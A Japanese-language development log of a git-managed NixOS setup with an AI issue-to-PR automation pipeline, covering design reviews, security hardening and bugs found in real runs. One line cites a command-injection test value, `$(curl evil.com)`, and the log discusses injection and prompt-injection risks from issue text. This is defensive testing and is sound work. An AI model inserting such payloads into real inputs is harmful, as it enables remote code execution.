# 構築ログ（記事用）

このファイルは「git で NixOS を管理する」プロジェクトを構築していく過程の意思決定・やり取りを、後で記事にまとめるために記録するログです。

---

## 2026-09-28 セッション開始

- `story.md`（NixOS × AI パイプラインのアーキテクチャ設計）を読み込み、これをベースに実際のリポジトリ構築を開始。
- 作業環境は Fedora（NixOS 本体ではない）。対象マシンは `t480s`（ThinkPad T480s）と推測されるが、既存の NixOS インストール状況は未確認。
- Deep Interview（ソクラテス式の要件確認）を開始し、以下のトップレベル・コンポーネント候補をユーザーに提示：
  1. リポジトリ基盤（flake.nix / hosts 構成）
  2. CI検証とCachix
  3. AI駆動 Issue→PR 自動化
  4. デプロイ運用
  5. 記事用ログ記録（このファイル自体）

## Deep Interview で確定した意思決定

- **対象機の状態**：t480s実機にはNixOSが未インストール。ユーザーがNixOS ISOで最小インストールを実施し、生成された `configuration.nix` / `hardware-configuration.nix` を提供。ホスト名はまだ `nixos`（プレースホルダー）、ユーザー名は `fse`。
  - 理由：ゼロからの新規セットアップであり、既存の稼働中システムの取り込みではないと判明したことで、作業範囲が「リポジトリ整備」中心に定まった。
- **ディレクトリ構造は flake-parts + Home Manager で構造化**：ホストは今後t480s以外にも増える見込みのため、最初から抽象化しておく判断。
  - 理由（Contrarianモードでの再確認）：単一ホストなら過剰設計になり得るが、多ホスト化を見越しているとの明言があったため採用継続。
- **AI駆動Issue→PR自動化（ai-issue-handler.yml）は今回スキップ**：ディレクトリ構成（`modules/packages.nix`分離など）はAI編集しやすさを意識するが、実際のworkflowファイルは作らず将来の拡張点として保留。
- **CI/Cachixはローカルでworkflowファイルのみ用意**：GitHubリモートリポジトリもCachixアカウントも未作成のため、今回は実接続・実行検証はできない。プレースホルダー付きで用意する。
- **デプロイは手動のみ**：`git pull && sudo nixos-rebuild switch --flake .` を自分で実行する運用。半自動SSHデプロイは将来検討。
- **ハードウェア構成の事実確認**：`hardware-configuration.nix` に `kvm-amd` が含まれておりIntel想定のT480sと矛盾すると指摘したが、ユーザーより「これが実機」との回答。AMD搭載モデルとして扱う。
- **シークレット管理は sops-nix を最初から導入**：公開リポジトリ運用のため、Wi-Fiパスワードやパスワードハッシュなど将来発生し得る秘密情報をリポジトリ整備の最初の段階から暗号化管理する方針に決定。
- **最終曖昧度スコア：18%**（閾値20%以下で確定）。10ラウンドのソクラテス式対話を経て収束。

## omc-planコンセンサス（Planner/Architect/Critic）でのプランニング

- Deep Interviewの仕様書を基に、Planner→Architect→Criticのループを3ラウンド実施
- v1・v2はいずれもCriticが**REJECT**。主な指摘は「`flake.nix`のoutputsラッパーが実際には評価できない（裸の識別子参照）」「hostnameとflakeアトリビュートの不一致でデプロイコマンドが失敗する」「オンマシン初回手順でexperimental-features有効化の順序が間違っている」など、構造だけでなく「実機での初回ブートが本当に成功するか」を重視した指摘が中心だった
- 3ラウンド目でCriticが**APPROVE WITH CHANGES**、Architectも「構造上のブロッカーなし」と判定。最大の残課題は「フレッシュインストール直後のt480sには`git`が無く、`.git`付きでリポジトリを転送すると初手から詰む」という鶏卵問題で、解決策は「`.git`を含めずに転送し、Nixにただのディレクトリとして評価させる」という単純な方式に落ち着いた
- 最終計画（v4）は`.omc/plans/nixos-git-t480s-plan.md`に`pending approval`として保存
- Open Questions（desktop.nixの範囲、hostname改名、`.omc/`除外、SSH有効化）は全て計画の推奨案どおりで確定

## 実装フェーズ（team実行）

- GitButlerで`t480s-nixos-repo`ブランチを作成。既存の`configuration.nix`/`hardware-configuration.nix`/`story.md`/`docs/article-log.md`をベースラインコミットとして先にコミットし、`.omc/`を最初から`.gitignore`することで、内部検討資料（Deep Interview仕様書・本計画）をリポジトリ履歴に一切残さない判断を実行時にも徹底した
- 3並行ワーカーで実装：①`flake.nix`+`hosts/t480s/`、②`modules/`+`home/`+sops関連、③CI workflow+テスト+README
- 実装後、計画のIn-session Verification Steps 1〜7（相対パス解決・flakeアトリビュート整合・識別子束縛・シークレット混入・リモート未作成・GitButler履歴確認など）をすべて実行し通過を確認。特に`hosts/t480s/configuration.nix`が元ファイルとの差分で「imports追加・hostname変更・experimental-features追加」の3点のみであること、`hardware-configuration.nix`がバイト同一であることを`git show <baseline>`との比較で確認した
- オンマシンでの実際の`nix flake check`実行・`nixos-rebuild`実行は未実施（Non-Goal）。README記載の手順をユーザーが実機で試す段階

## GitHub公開・運用フェーズ

- ユーザーが自身でGitHubリポジトリ（`furubese/my-nixos-git-t480s`）を作成・push。ローカルの作業ディレクトリも`my-nixos-git-t480s`に改名
- Cachixの`CACHIX_AUTH_TOKEN`をGitHub Actions Secretsに登録。チャットに一時的に貼られたトークンは無効化・再発行し、新しいものを登録する運用にした（秘密情報をチャットや履歴に残さない判断の徹底）
- `check-light.yml`/`check-desktop.yml`のCachixキャッシュ名プレースホルダーを実名（`nixos-furubese-t480s-5gb`）に置換

## 追加機能：zsh + oh-my-zsh のNix管理化

- デフォルトシェルをzshにし、oh-my-zshを導入したいという要望を受け、システム側（ログインシェル切り替え・`/etc/shells`登録）とユーザー側（oh-my-zshのテーマ・プラグイン等）を分離して設計
  - 理由：ログインシェルの変更はシステム全体に影響するためNixOSモジュール（`modules/shell.nix`）に、oh-my-zshの中身は個人設定なのでHome Manager（`home/fse.nix`）に、と責務を分けた
- `modules/shell.nix`を新規追加し`hosts/t480s/configuration.nix`からimport。`home/fse.nix`に`programs.zsh.oh-my-zsh`設定を追加
- CIの`paths`フィルタを`modules/packages.nix`単体から`modules/**`に広げた（新しいモジュールを追加するたびに個別列挙するのは壊れやすいため）

## テスト→PRフローの確認（Deep Interview 2回目）

- 「Nixコード変更はテストを通してからPRを出してほしい」という要望を受けて短いDeep Interviewを実施。調査の結果、`check-light.yml`が既に`pull_request`トリガーで自動テストを実行する設計になっており、要望の大部分は既に満たされていることが判明
- GitHub Branch protection（必須ステータスチェック）による強制ブロックも検討したが、`check-light.yml`がpathsフィルタ付きのため、Nixコードを含まないPR（AGENTS.mdのみ等）に同じ必須チェックをかけると永久に判定待ちになりマージ不能になるという既知の落とし穴が判明。ユーザーの判断でブロック機構は導入しないことに決定
- 曖昧度8%で早期収束（新規実装が不要と分かったため、omc-planコンセンサスは経由せず直接実行）。`feat-zsh-ohmyzsh`（PR #1）と`docs-agents-md`（PR #2）を実際にPR化し、動作を確認する運びとした

## AI駆動Issue→PR自動化の実装（story.mdの構想を実現）

- 以前のDeep Interviewで意図的に見送っていた`ai-issue-handler.yml`を、ユーザーからの明示的な依頼を受けて実装
- 実装前に2点確認：①公開リポジトリでの起動条件（ラベルゲート方式を採用。ラベル付与にはtriage/write権限が必要なため、誰でも作成できるissueだけでは起動しない）、②ANTHROPIC_API_KEYの有無（未取得とのことで、Anthropic Consoleでの取得手順を案内）
- story.mdの元案から一歩進めて、AIには`modules/packages.nix`の編集のみを許可（`Bash`ツールなし）し、ブランチ作成・差分検証（対象ファイル以外が変更されていたら中断）・コミット・PR作成はワークフロー側の確定的な処理で行う設計にした
  - 理由：issue本文は信頼できない入力（プロンプトインジェクションの可能性）であり、AIの出力をそのままgit操作に使うのはリスクが高いため
- この開発環境にはGitHub Actionsを実行する手段が無く、`claude --print`/`--allowedTools`の実際の挙動は未検証のまま実装した旨をREADMEに明記

## Anthropic APIからOpenRouter（GLM 5.3）への切り替え

- ユーザーからANTHROPIC_API_KEYがProプラン（claude.aiサブスクリプション）とは別の従量課金契約である点を確認された後、「代わりにOpenRouter APIにする」との要望
- 実際に`claude --help`を確認したところ、Claude Code CLIがサポートするサードパーティプロバイダはBedrock/Vertex/Foundryのみで、OpenRouterは非対応と判明。ユーザーは当初この点を誤解していた（「claude cliは使わないですよね？」との質問があったが、実際には`claude --print`ステップがまさにCLIを呼んでいた）
- モデルはGLM 5.3を希望。WebSearchでOpenRouterの実際のモデルID（`z-ai/glm-5.3`）を確認してから実装（GLM 5.3 Prime等の類似モデル名と混同しないため）
- Claude Code CLIのツール権限機構（Editのみ許可）が使えなくなる代わりに、より厳格な設計に変更：AIには「追加後の完全なパッケージ名リスト」をJSON配列としてのみ出力させ、各要素を識別子パターンで検証したうえでワークフロー側が固定テンプレートに埋め込む方式にした。AIにNixコードそのものを一切生成させないため、結果的により安全な設計になった
  - バリデーションロジックは単体テストで、正常系（`["git","htop"]`等）と攻撃的な入力（`$(curl evil.com)`、JSON以外のフェンス付き応答等）の両方が想定通り拒否/受理されることを確認済み
- 実装中に、直前のClaude CLI版に含まれていたセキュリティ上の不備（issue本文をシェルの`run:`ブロックに直接埋め込んでおり、コマンドインジェクションの余地があった）にも気づき、OpenRouter版では環境変数経由で渡す形に修正した

## CI失敗時の自動修正ループ（2回目のDeep Interview）

- 「PRで失敗したとき自動で修正できないのでは」という指摘を受けてDeep Interviewを実施（5ラウンド、曖昧度17.5%で収束）
- Round 4でContrarianモードを発動：「失敗原因（パッケージ名の問題 vs Cachix認証等の無関係な問題）を区別しないと、修正不可能な失敗でも毎回3回無駄に試行してしまうのでは」と提起。ユーザーはこれを認識した上で、実装のシンプルさを優先し「区別しない」設計を選択（無駄な試行のコストは意図的に許容）
- 試行回数の管理に外部の状態ストアを使わず、PRブランチ上のコミット数（`git rev-list --count origin/main..HEAD`）で数える設計にした。ステートレスな`workflow_run`イベント間で「今何回目か」を追加インフラなしに把握できる
- `workflow_run`トリガーは対象ワークフローの`name:`フィールドと完全一致させる必要があると気づき、`check-light.yml`に明示的な`name: check-light`を追加した（元は無名で、ファイル名から暗黙的に決まる名前に依存するのはリスクがあるため）
- 曖昧度が閾値を下回った時点で、omc-planコンセンサスは経由せず直接実装（既存のai-issue-handler.ymlと同じ安全設計を再利用するだけなので、新規の合意形成コストは不要と判断）

## 実運用での問題発覚（issue #4, #6, #8, #10, #12で実地テスト）

- mise・pythonパッケージ・openssl（ssh用）・ディスプレイマネージャー・Niri/Noctaliaと、実際にissueを5件出して`ai-issue-handler.yml`を試した
- GitHub Actionsのデフォルトセキュリティ設定「Allow GitHub Actions to create and approve pull requests」がオフだったため、最初の実行（issue #4）は`gh pr create`が`GraphQL: GitHub Actions is not permitted to create or approve pull requests`で失敗。設定を有効化して解決
- ラベルの付け外しで2回ワークフローが発火し、2回目が「ブランチが既にある」形で失敗する競合も実地で確認（想定していなかった穴）
- **設計上の限界が判明**：ディスプレイマネージャー（issue #10→PR #11）やNiri/Noctalia（issue #12→PR #13）を依頼したところ、AIは`lightdm`・`niri`・`noctalia`を単なるパッケージ名として`environment.systemPackages`に追加しただけで、`services.displayManager.lightdm.enable`のような実際のサービス有効化は一切行われなかった。ユーザーからは「PRの名前が全部同じで区別できない」「CIが通っても気に入らない時に指摘する手段がない」「user-scope（Home Manager）の考慮がない」「モジュール化されておらずpackages.nixに全部書かれる」という具体的な指摘があり、2回目のDeep Interviewを開始した

## AI編集スコープの全面再設計と5ラウンドのコンセンサスレビュー

- 2回目のDeep Interview（10ラウンド、曖昧度19.25%）で、AIにNixコードを自由に生成させる方向へ大きく舵を切ることを決定。「安全なJSON配列出力」という制約を撤廃する、セキュリティ上重要な決定だったため、omc-planコンセンサス（Architect/Criticレビュー）をDeliberate modeで実施
- **v1→v2**：Architectが「`modules/`配下すべてを自動importする設計だと、既存の`modules/overlays.nix`（overlay関数）を誤ってNixOSモジュールとしてimportしてビルド全体を破壊する」という致命的バグを発見。opt-inサブディレクトリ（`modules/ai/`）方式に変更
- **v2→v3**：Planner自身が「check-light.ymlは実際にPR上で自動実行されることをGitHub APIで確認した」と誤った自己検証を報告してしまった（`conclusion: success`だけ見て`run_attempt`と`triggering_actor`を見落とした）。Architectの再レビューで「GITHUB_TOKENが作ったPRの初回ワークフロー実行は人間の手動承認が必要」というGitHub仕様が原因と判明し、ユーザーに`workflow_dispatch`での明示起動を選ぶか手動承認を継続するか確認、自動化維持を選択
- **v3→v4（Critic REJECT）**：Criticが実際の実行履歴を精査し、「`workflow_dispatch`で起動しても`workflow_run`トリガーでautofixが連鎖する」という設計の前提が、autofixマージ後の実行履歴（bot起動のcheck-light完了4件、autofix発火0件）から見て機能していないことを実証。check-light自身が失敗時に直接`gh workflow run`でautofixをdispatchする設計に変更し、不確実な連鎖への依存を排除
- **v4→v5**：Architectがアーキテクチャ自体は妥当と認めつつ、権限不足・ログ取得の競合状態・入力値未検証によるセキュリティ後退・YAML構文エラー・新規ファイルを見逃す差分チェック・正規表現の抜け、の6件を発見。全て修正
- **v5→v5.1**：最終レビューで、修正のうち4件（`_trusted`チェックアウト順序・`GH_REPO`未設定・concurrencyキーの文字列不一致・正規表現修正の適用漏れ）がなお未解決と判明。**この時点でコンセンサスループの上限5回に到達**したため、Plannerが単独で最終修正を行い、Architect/Criticの再レビューを経ないまま「未レビューの最終版」として正直に開示した上でユーザーに提示することにした
- 5ラウンドを通じて一貫していたパターン：毎回「アーキテクチャは妥当」というお墨付きの直後に、実装の具体的な部分（権限、イベントの意味論、正規表現の境界条件）に新しいバグが見つかった。AIエージェント同士のレビューでも、実装の細部の検証には限界があることを示す実例になった
- **v5.1→v5.2（正式ループ外の追加スポットチェック）**：ユーザーが「未レビューのv5.1をそのまま進めるのは不安なので、もう1ラウンドだけArchitectレビューを追加で回したい」と希望。正式な5ラウンドコンセンサスの外側で、Architect単独（Criticなし）にv5.1の4件の修正だけを対象に絞った再検証を依頼した。結果、4件のうち1件（`_trusted`チェックアウト順序の修正）が**新たな**ブロッキングバグを生んでいたことが判明：autofixジョブで`_trusted`を先にcheckoutした後、対象ブランチを`path`未指定でcheckoutすると、`actions/checkout`が「一致する`.git`のないディレクトリの中身を削除する」仕様により直前の`_trusted/`ごと消えてしまい、後続の検証ステップが毎回失敗する設計になっていた。加えて、同じv5.1修正のうち`.git/info/exclude`方式が`ai-issue-handler.yml`にしか適用されておらず、`ai-issue-autofix.yml`と`ai-issue-feedback.yml`には未反映だったことも判明
- 対応として、autofixは`_trusted`を`$RUNNER_TEMP`へ退避してからブランチをcheckoutする方式に変更（ブランチに触れる前に入力検証を済ませる必要があるため、`.git/info/exclude`方式ではなく退避方式を採用）、feedbackはhandlerと同じ「ブランチ先・`_trusted`後・exclude登録」方式に統一。あわせて正規表現の軽微な抜け2件（`Extra`の大文字限定、クォート付きキー未対応）も修正した
- **このラウンドが示したこと**：正式な5ラウンドコンセンサスの上限に達した後の「念のための追加チェック」でも、新しいバグが見つかった。レビューを重ねるほど収穫逓減にはなるが、ゼロにはならない——という、このプロジェクト全体を通じて繰り返し実証されたパターンが、ループの枠外でも再現した。実装着手前に少なくとも一度は実機（GitHub Actions上）での動作確認を必須にすべき、という結論を補強する材料になった

## v5.2計画の実装（`.github/scripts/ai_pipeline.py`、3ワークフロー、`modules/ai`・`home/ai`）

- 「ペーパーレビューは収穫逓減に入った。これ以上重ねるより実装して実機で試す方が効率的」という判断で実装フェーズへ進むことをユーザーに推奨し、承認を得た
- 共有検証スクリプト`.github/scripts/ai_pipeline.py`を新規作成。パス許可リスト検証・ブランチ名検証・issue本文/PRコメントのサニタイズ（HTMLコメント除去、未クローズのコメントも含む）・アドバイザリ内容スキャン・`validate-dispatch`（`gh`経由でのブランチ/PR/run_id相互検証）をCLIサブコマンド兼importable moduleとして実装し、pythonの単体アサーションで動作確認（この開発環境にはnixもGitHub Actionsの実行手段も無いため、これが実質的な唯一の実行時検証）
- `modules/ai/default.nix`, `home/ai/default.nix`を新規作成：直下の`*.nix`ファイルのみを自動importする「オプトイン方式」。v1→v2のレビューで見つかった「`modules/**`全体を自動importすると`modules/overlays.nix`（NixOSモジュールではなくoverlay関数）を巻き込んで壊れる」というバグを最初から回避する設計として、計画通りに実装した
- `tests/ai/default.nix`も同様の許可パスとして作成したが、`flake.nix`（AI編集スコープ外）への配線はまだ行っていない——既存の`tests/desktop-full.nix`と同じく「予約済みだが未配線のプレースホルダー」という扱いにした
- `hosts/t480s/configuration.nix`・`home/fse.nix`にそれぞれ`modules/ai`・`home/ai`のimportを追加（これは人間が行うセットアップ作業であり、AI編集スコープの制約対象ではない）
- `check-light.yml`・`ai-issue-handler.yml`・`ai-issue-autofix.yml`を計画通りに全面書き換え、新規`ai-issue-feedback.yml`を作成。3つのAIワークフローとも、AIの出力を「ファイルパス→内容のJSONマップ」として受け取り、許可リスト検証→`nix-instantiate --parse`による構文チェックのみ（ビルド検証はcheck-light.ymlに委ねる）→advisory内容スキャン（ブロックせずラベル付けのみ）という同じ検証パイプラインを通す設計にした
- 実装中に見つけた計画からの小さな乖離：計画では`vars.AI_PIPELINE_ENABLED`のキルスイッチを「check-lightのdispatch-autofixジョブ、handler/autofix/feedbackの起動条件すべてに適用」と明記していたが、最初の実装ではcheck-light側にしか反映しておらず、書きながら見直して3ワークフローすべてのジョブ条件に追加した。計画書の文言を実装時にもう一度読み直すことの重要性を実感した一幕
- `AGENTS.md`・`README.md`を新設計に合わせて全面更新。`AGENTS.md`にはAIパイプラインの設計判断の理由（なぜ`workflow_run`連鎖をやめたか、なぜ`_trusted`を`$RUNNER_TEMP`へ退避するか等）を、後から読む人間・エージェントが再発明しなくて済むよう明記した
- 実装後、`AGENTS.md`が自ら定めている「nixが無い環境での機械的チェック」（相対パス存在確認、flake.nix参照の整合性、bareな入力参照の禁止、シークレットパターンのgrep）を一通り実行し、いずれも問題なしを確認。ただし実際の`nix flake check`・`nixos-rebuild test`・GitHub Actions上での動作確認はまだ行っていない——次にやるべきことは、テスト用issueを1件出して実地で動かしてみること
- 実装コミットをGitButlerでpush・PR作成（`ai-handler-plan-v52-review`が親、`ai-handler-redesign-implementation`が子のスタック構成のためPRも2本に分かれた：#14と#15）。ユーザーが両PRをマージし、`but pull`でローカルワークスペースも追従させた
- `AI_PIPELINE_ENABLED`リポジトリ変数はGitHub Web UI（Settings → Secrets and variables → Actions → Variablesタブ）から設定してもらった。この開発環境には`gh`の認証手段が無いため、キルスイッチのような「一度だけ設定すればよいリポジトリ設定」はユーザー側の作業として明確に切り分けた

## 実地テスト第1弾：issue #17（Niri/Noctalia、旧バグの回帰テスト）

- ユーザーの選択で、以前まさに問題が発覚したのと同じテーマ（issue #10/#12→PR #11/#13で「パッケージ名だけ追加されサービス有効化されない」という不具合が出た、Niri/Noctaliaのディスプレイマネージャー整備）でissue #17を作成。新設計が本当にこの不具合を解決できているかを直接検証する、最も意味のある最初のテストケースとして選んだ
- issue #17に`package-request`ラベル付与後、`ai-issue-handler.yml`が起動（run 36590240481）。GitHub Actions APIで進行状況を確認したところ、チェックアウト・作業ブランチ作成・`_trusted`除外登録・`_trusted`チェックアウト・nixインストールまでは全ステップ成功し、OpenRouter (GLM 5.3) への問い合わせステップで進行中——これは今回のレビューサイクルで何度も修正した部分（チェックアウト順序、`.git/info/exclude`）が実地でも問題なく動いていることを示す、最初の実証データ
- **結果：成功**。PR #18として`home/ai/niri-config.kdl`（141行、許可した`.kdl`拡張子が実際に使われた）・`home/ai/niri.nix`・`modules/ai/niri-desktop.nix`の3ファイルが生成された。決定的だったのは`modules/ai/niri-desktop.nix`の中身——`programs.niri.enable = true;`, `services.greetd.enable = true;`（lightdmではなくWayland向けのgreetd+tuigreetをAIが自分で選択）など、**パッケージ名ではなく実際のサービス有効化コード**が生成されていた。これがまさにこの再設計全体の出発点だった不具合（issue #10/#12→PR #11/#13でパッケージ名だけ追加されサービスが有効化されなかった件）の直接的な解消の証拠になった
- advisory content scanも正しく機能：`security.polkit.enable`を含んでいたため`needs-careful-review`ラベルが自動付与された（ブロックはせず、レビュー時の注意喚起のみという設計通り）
- **想定外の発見（バグではないが無駄）**：`check-light.yml`がこのPRに対して2回走っていた。1つは`ai-issue-handler.yml`が明示的に`gh workflow run check-light.yml --ref`で起動した`workflow_dispatch`版（承認不要で即成功——設計通り）。もう1つは`check-light.yml`に残したままの`on.pull_request`トリガーがPR作成時に自動発火したもので、こちらは`GITHUB_TOKEN`作成PRの初回実行として`action_required`でブロックされ、ユーザーが手動で承認して動かしていた。パイプラインの正しさ自体には影響しない（`workflow_dispatch`版が実質的な検証を担っている）が、CIが二重に走り、かつ人間の承認クリックが（本来不要なはずなのに）結局1回発生するという非効率が実地で初めて判明した。5ラウンド＋αのペーパーレビューでは指摘されなかった点で、「実装して実際に動かしてみないと分からないことがある」というこのプロジェクト全体の教訓を裏付ける一例になった

## モジュール移行後の棚卸し：`modules/packages.nix`に残っていた旧設計の残骸

- ユーザーがPR #18をマージした後、「`modules/packages.nix`などが過去AIが変に変更したままなのは仕方ないのか」と指摘。調べたところ、旧設計（パッケージ名JSON配列のみ出力）時代に追加されたパッケージが、今回の再設計後も未整理のまま残っていることが判明した：
  - `lightdm`, `lightdm-gtk-greeter`（issue #10）：PR #18のniri+greetd+tuigreet化で完全に代替されたが、パッケージとしてはインストールされ続けていた（サービス有効化されていないため実害はないが死んだ設定）
  - `niri`（issue #12）：`modules/ai/niri-desktop.nix`の`programs.niri.enable`が既にパッケージを引き込むため冗長
  - `openssh`（issue #6）：**旧設計の不具合がそのまま残っていた実例**。パッケージとしては入っているが`services.openssh.enable`は`hosts/t480s/configuration.nix`で今もコメントアウトされたまま——つまりsshdは有効化されていない。これはまさにこの再設計のきっかけになった「パッケージだけ追加されサービスが有効化されない」問題そのものが、`modules/packages.nix`という今はAI編集スコープ外になったファイルの中に、直り切らずに残っていたことを意味する
- `modules/packages.nix`は今回の再設計で明確に「人間編集専用」と位置づけたファイルなので、これはAIパイプラインの継続的な監視対象ではなく、人間（またはユーザーの指示を受けたエージェント）が棚卸しすべき箇所と判断。ユーザーにopensshの意図（sshdを実際に有効化したいか、クライアントコマンドのみで十分か）を確認したところ「クライアントだけで十分」との回答だったため、sshdは意図的に無効のままとし、その旨をコメントで明記。`lightdm`/`lightdm-gtk-greeter`/`niri`は削除した
- **教訓**：AIパイプラインの設計をいくら改善しても、それ以前に生成された変更が既にマージされてリポジトリに残っている場合、新しい安全設計は遡及的には効かない。移行時の棚卸しは自動化できず、人間が明示的に気づいて対応する必要がある一例だった

## 実機トラブル：ブートローダーインストール失敗（"No space left on device"）

- PR #19マージ後、実機で`nixos-rebuild switch`を実行したところ、`systemd-run ... Failed to install bootloader ... /boot/EFI/nixos/....tmp`で失敗。`OS Error: No space left on device`が原因
- 最初、世代の蓄積（過去の`nixos-rebuild switch`の繰り返しで古いカーネル/initrdがESPに溜まった）を疑い、`nix-collect-garbage -d`と`boot.loader.systemd-boot.configurationLimit`の追加を提案しかけたが、ユーザーから「世代はまだ2つしかない」「EFIボリュームはほとんど容量を確保していない」と訂正が入った。早合点で`modules/boot.nix`を書きかけたが、この時点ではまだ実機の状況（パーティション構成）を確認していなかったため、ユーザーに一度差し戻された
- 実態を確認したところ、「パーティションサイズはWindowsのデフォルト」——つまりこのマシンはWindowsとのデュアルブートで、EFIシステムパーティションがNixOS用に作り直されておらず、Windowsインストーラーが確保する典型的な小容量（数百MB程度）のまま使われていたことが判明。NixOSのカーネル+initrdが2世代分入るだけで埋まってしまう、という組み合わせだった
- 対応の選択肢として (1) 既存ESPの拡張（パーティション操作、実機へのリスクが高い）、(2) NixOS専用の新規ブートパーティションを別に切る（Windowsに触れず安全だが空き領域が要る）、(3) 世代保持数を1に制限してパーティション操作を避ける、の3つを提示
- ユーザーは(3)を選択。理由は明確で「世代は1で良い。githubで管理しているのだから」——NixOS自体のロールバック機能を手放す代わりに、設定変更の履歴・切り戻しはgit（`git revert`等）に委ねるという判断。このリポジトリ自体がgitで設定を管理する構成である以上、筋の通った割り切り方だった
- `modules/boot.nix`（`boot.loader.systemd-boot.configurationLimit = 1;`）を新規作成し、`hosts/t480s/configuration.nix`のimportsに追加。パーティション操作という実機への不可逆リスクを一切取らずに解決した
- **この一連のやり取りで得た教訓**：診断の初手で状況を決めつけて対応（`configurationLimit = 5`での書き込み）を始めてしまい、ユーザーに一度止められた。実機の物理的な制約（パーティションレイアウト等）はリポジトリのコードから読み取れない情報であり、勝手に推測せず先に実態を確認すべきだった、という反省点

## 実機トラブル（続き）：修正後switch成功後もniri/greetdが起動しない

- PR #20（`configurationLimit = 1`）マージ後、`git pull && sudo nixos-rebuild switch --flake .`が成功しrebootしたが、ログイン画面はtuigreet（テキストUIの専用グリーター）ではなく従来通りのコンソールログインのまま、ログイン後もzshが起動するだけでniriは一切立ち上がらなかった
- `systemctl status greetd` →「Unit greetd could not be found」。ソース側（`modules/ai/niri-desktop.nix`の`services.greetd.enable = true`、`modules/ai/default.nix`の自動import、`hosts/t480s/configuration.nix`のimports）はすべてGitHub上で確認済みで問題なし、実機のリポジトリも最新に同期済みであることも確認したが、それでも`nix-store -q --requisites /run/current-system | grep -i greetd`が**空**——つまり「現在起動中のgenerationは最新のはずなのに、その中身にgreetdが含まれていない」という食い違いが実測で確定した
- 原因の特定はできなかったが（ブートローダーの容量エラー騒動の直後だったため、switch処理の内部状態に何らかの一時的な不整合があった可能性が高い、程度の推測にとどまる）、その場で`sudo nixos-rebuild switch --flake . --show-trace`を素直にもう一度実行し、再起動したところ解決した
- **教訓**：`nixos-rebuild switch`が「成功」と表示されても、実際に反映されたかどうかは`nix-store -q --requisites /run/current-system`のような直接的な検証で確認しないと分からないことがある、という実例。原因不明のまま「もう一度やり直す」で解決するケースも実運用ではあり得るが、記事としては「なぜ直ったかは特定できていない」という限界も正直に記録しておく

## 実運用バグ発覚：AI Autofix/Feedbackが一度も動いていなかった（作成者判定の実装ミス）

- その後issue #24〜#52系列を次々試す中で（docker, zellij, GitButler, Steam, 日本語入力等）、ユーザーから「いくつかissueを投げたが、PRでAI Autofixがうまく動いていない」と報告。`/deep-interview`で調査を開始
- 「探索（explore）してから聞く」の原則に従い、ユーザーに聞く前にGitHub Actions APIで実行履歴を直接確認したところ、**直近10回の`ai-issue-autofix.yml`実行が、すべて同一ステップ「入力検証（validate-dispatch）」で100%失敗**していることが判明（間欠的ではなく確定的なバグ）
- 原因：`.github/scripts/ai_pipeline.py`の`validate_dispatch`内、`pr.get("author", {}).get("id") == "github-actions"`という比較。`gh pr list --json author`が返す`author.id`はGraphQLの不透明なノードIDであり、文字列`"github-actions"`と一致することは原理上あり得ない——**実質的に常にFalseになる、autofix実装当初から一度も機能していなかったバグ**だった
- 実際にREST API（`GET /repos/.../pulls/49`）を直接叩いて確認したところ、github-actions作成のPRは`user.login == "github-actions[bot]"`、`user.type == "Bot"`になることを実証。この値を根拠に判定ロジックを書き直した（`gh pr list`のGraphQLベースの`author`フィールドの正確な形は未検証のまま使わず、実際に確認済みのREST APIフィールドに寄せた）
- ソースコードを確認した際、**同じ比較パターン（`author.id == "github-actions"`）が`ai-issue-feedback.yml`のresolveジョブにも存在する**ことを発見。まだ実際には失敗事例として報告されていなかったが（PRコメントでの修正依頼を誰も試していなかったため）、同じ原因で常に拒否されるはずだった。ユーザーに確認し、修正対象に追加
- この回は「設計判断ではなく実装バグの修正」という性質上、omc-planコンセンサス（Architect/Critic）は使わず、ユーザーの明示的な選択により対話内で直接修正・GitButlerでコミットする、より軽量なフローを取った
- **教訓**：これまでの5ラウンド＋αのレビューでは、`validate_dispatch`のロジック自体は（単体テストも書いた上で）「正しそう」に見えていたが、`gh`コマンドが実際に返すJSON構造の細部（GraphQLの`author.id`が何を意味するか）は、この開発環境に`gh`が無く一度も実行検証できなかった。レビューでいくら議論しても、実際に動かして初めて発覚する類のバグがあり、今回もその通りになった

## 続報：修正版も最初は同じ場所でまた失敗した（`gh api`のGET/POST自動切り替え）

- ユーザーに4件のPRでcheck-lightを手動再実行してもらったところ、「また同じエラー」との報告。実行履歴を確認すると、確かに修正後の新しいautofix実行が発生していたが、**全く同じステップ「入力検証」でまた失敗**していた
- 原因は今回の修正自体に含まれていた別のバグ：`gh api repos/.../pulls -f head=... -f state=...`のように`-f`（クエリパラメータ）を付けると、`gh api`は**デフォルトでGETではなくPOSTを送る**という仕様があり、意図した「PR一覧の取得（GET）」ではなく「PR作成（POST）」エンドポイントを誤って叩いていた。結果として同じ検証ステップが、今度は別の理由で落ちていた
- `--method GET`を明示することで修正。あわせて、`head.repo.full_name`フィールドも実際にREST APIを叩いて値を確認してから使った（前回の`user.login`/`user.type`と同様、推測ではなく実測に基づく）
- **教訓**：一度バグを直しても、その修正自体に新しいバグが紛れ込む可能性は常にある、という実例がまたしても発生した。`gh`コマンドの細かい仕様（フラグの有無でHTTPメソッドが変わる、という非直感的な挙動）は、この開発環境でコマンドを直接試せない限り見落としやすい。修正を主張する前に「本当に直ったか」を実行ログで確認する重要性を、プロジェクト全体を通じてまた一つ積み重ねた形になった

## 修正の波及効果：自己修復は動いたが、試行上限到達後のエスカレーションコメントが無限に増える

- 2件のバグ修正をマージ後、実際にPR #28で**autofixが初めて正常に動き、修正コミットをpushしてcheck-lightを再度通す**という、設計通りの自己修復が実地で確認できた
- 一方PR #39（issue #26、fcitx5 + Mozc日本語入力）では、3回の自動修正を試みても根本原因が直らず、試行上限に到達。ここまでは想定通りだが、**同じ「自動修正を3回試みましたが…」というエスカレーションコメントが3回も重複投稿**されてしまった
- 原因：`check-light.yml`の`dispatch-autofix`はPRの試行回数を知らず、ビルドが失敗するたびに無条件でautofixを再dispatchする。autofix側は「試行上限に達したらコメントする」ロジックはあったが、「既にコメント済みかどうか」を見ずに毎回投稿していたため、check-lightが失敗し続ける限りコメントが際限なく増えてしまう設計漏れだった
- 修正：コメント投稿前に、PRの既存コメントを`gh api`で取得し、同じ文面（「自動修正を3回試みましたが」で始まる）のコメントが既にあればスキップするガードを追加
- **教訓**：「3回まで試して諦める」という上限ロジック自体は正しくても、「上限に達した後、何度再トリガーされても同じ通知を繰り返さない」という副次的な冪等性まではDeep Interview・コンセンサスレビューのどちらでも明示的に検討されていなかった。実際に運用して初めて気づく、設計レビューの死角の一例

## PR #39（fcitx5+Mozc）が試行上限に到達：「もっと頑張ってほしい」をどう設計するか

